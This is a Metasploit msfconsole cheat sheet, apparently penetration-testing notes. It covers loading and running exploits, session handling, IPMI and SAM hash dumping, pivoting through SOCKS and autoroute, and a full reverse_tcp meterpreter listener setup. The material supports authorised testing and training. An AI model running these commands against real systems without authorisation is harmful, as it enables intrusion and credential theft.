# MSF - msfconsole

## MSF - IPMI version detection  - Footprinting
```
msf6 auxiliary(scanner/ipmi/ipmi_version)
```

## MSF - Dump IPMI hashes - Exploitation
```
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)
```

Here is the reformatted text:

## Show all exploits within the Framework.
```
msf6 show exploits
```

## Show all payloads within the Framework.
```
msf6 show payloads
```

## Show all auxiliary modules within the Framework.
```
msf6 show auxiliary
```

## Msf - list payloads
```
show payloads
```

## Search for exploits or modules within the Framework.
```
msf6 search <name>
```

## Load information about a specific exploit or module.
```
msf6 info
```

## Load an exploit or module (example: use windows/smb/psexec).
```
msf6 use <name>
```

## Load an exploit by using the index number displayed after the search command.
```
msf6 use <number>
```

## Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells.
```
msf6 LHOST
```

## The remote host or the target. set function Set a specific value (for example, LHOST or RHOST).
```
msf6 RHOST
```

## Set a specific value globally (for example, LHOST or RHOST).
```
msf6 setg <function>
```

## Show the options available for a module or exploit.
```
msf6 show options
```

## Show the platforms supported by the exploit.
```
msf6 show targets
```

## Specify a specific target index if you know the OS and service pack.
```
msf6 set target <number>
```

## Specify the payload to use.
```
msf6 set payload <payload>
```

## Specify the payload index number to use after the show payloads command.
```
msf6 set payload <number>
```

## Show advanced options.
```
msf6 show advanced
```

## Automatically migrate to a separate process upon exploit completion.
```
msf6 set autorunscript migrate -f
```

## Determine whether a target is vulnerable to an attack.
```
msf6 check
```

## Execute the module or exploit and attack the target.
```
msf6 exploit
```

## Run the exploit under the context of the job. (This will run the exploit in the background.)
```
msf6 exploit -j
```

## Do not interact with the session after successful exploitation.
```
msf6 exploit -z
```

## Specify the payload encoder to use (example: exploit –e shikata_ga_nai).
```
msf6 exploit -e <encoder>
```

## Display help for the exploit command.
```
msf6 exploit -h
```

## List available sessions (used when handling multiple shells).
```
msf6 sessions -l
```

## List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system.
```
msf6 sessions -l -v
```

## Run a specific Meterpreter script on all Meterpreter live sessions.
```
msf6 sessions -s <script>
```

## Kill all live sessions.
```
msf6 sessions -K
```

## Execute a command on all live Meterpreter sessions.
```
msf6 sessions -c <cmd>
```

## Upgrade a normal Win32 shell to a Meterpreter console.
```
msf6 sessions -u <sessionID>
```

## Create a database to use with database-driven attacks (example: db_create autopwn).
```
msf6 db_create <name>
```

## Create and connect to a database for driven attacks (example: db_connect autopwn).
```
msf6 db_connect <name>
```

## Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as –sT –v –P0.)
```
msf6 db_nmap
```

## Delete the current database.
```
msf6 db_destroy
```

## Delete database using advanced options.
```
msf6 db_destroy <user:password@host:port/database>
```
## msf6 - Search for RDP scanner
```
msf6 > search rdp_scanner
```
## msf6 - Use multi-handler exploit
```
msf6 > use exploit/multi/handler
```

## msf6 - Run ping sweep
```
msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

## msf6 - Use SOCKS proxy module
```
msf6 > use auxiliary/server/socks_proxy
```

## msf6 - List running jobs
```
msf6 auxiliary(server/socks_proxy) > jobs
```

## msf6 - Use autoroute module
```
msf6 > use post/multi/manage/autoroute
```

## msf6 - Windows PriEsc - LocalExploit suggester
```
search local_exploit_suggester
```
## msf6 - Windows PriEsc - Hashdump
```
hashdump
// OR
lsa_dump_sam
```

## msf - setting up a listener the correct way
```
# MSF - Listener
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/(optionalx32 or x64)/meterpreter/reverse_tcp
Important : the architecture should match the one used to generate the meterpreter using msfvenom.
msf exploit(handler) > set LHOST 192.168.0.100
msf exploit(handler) > set LPORT 4444
msf exploit(handler) > set ExitOnSession false
msf exploit(handler) > exploit -j
```

## msf - tips for LPE/use of exploit through a meterpreter session
```
Tips for LPE/use of exploit through a meterpreter session
1. Once a meterpreter session has been established, you can use msf's exploit module to privesc locally.
2. Usually, the exploit prompt you to use an active meterpreter session. Use the one matching the machine to pwn.
```
